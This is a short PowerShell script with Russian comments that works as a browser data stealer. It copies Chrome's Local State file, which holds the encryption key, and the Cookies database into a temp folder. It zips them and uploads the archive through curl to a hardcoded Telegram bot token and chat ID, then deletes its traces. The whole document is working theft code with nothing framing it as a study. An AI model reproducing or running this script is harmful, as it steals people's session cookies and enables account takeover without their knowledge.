$token = "8680192798:AAFdHwzr2HYwbGjz3gkaS5xlYjryAozMkGI"
$chatId = "1940923712"

# Пути к файлам
$userData = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$localState = "$userData\Local State"
$cookies = "$userData\Default\Network\Cookies"

# Куда копируем
$destDir = "$env:TEMP\collect"
New-Item -ItemType Directory -Path $destDir -Force | Out-Null

try {
    # 1. Забираем Local State (там зашифрованный ключ)
    Copy-Item $localState -Destination "$destDir\ls.json" -Force
    
    # 2. Забираем Cookies (база данных)
    # Если браузер открыт, обычное копирование может не сработать, используем 'Force'
    Copy-Item $cookies -Destination "$destDir\c.db" -Force

    # 3. Архивируем и отправляем (используем встроенный в Windows Compress-Archive)
    $zipFile = "$env:TEMP\data.zip"
    Compress-Archive -Path "$destDir\*" -DestinationPath $zipFile -Force
    
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendDocument" -F "chat_id=$chatId" -F "document=@$zipFile"
    
    # Чистим за собой
    Remove-Item $destDir -Recurse -Force
    Remove-Item $zipFile -Force
    
    Write-Host "Success! Archive sent."
} catch {
    & curl.exe -s -X POST "https://api.telegram.org/bot$token/sendMessage" -d "chat_id=$chatId" -d "text=Error collecting files"
}
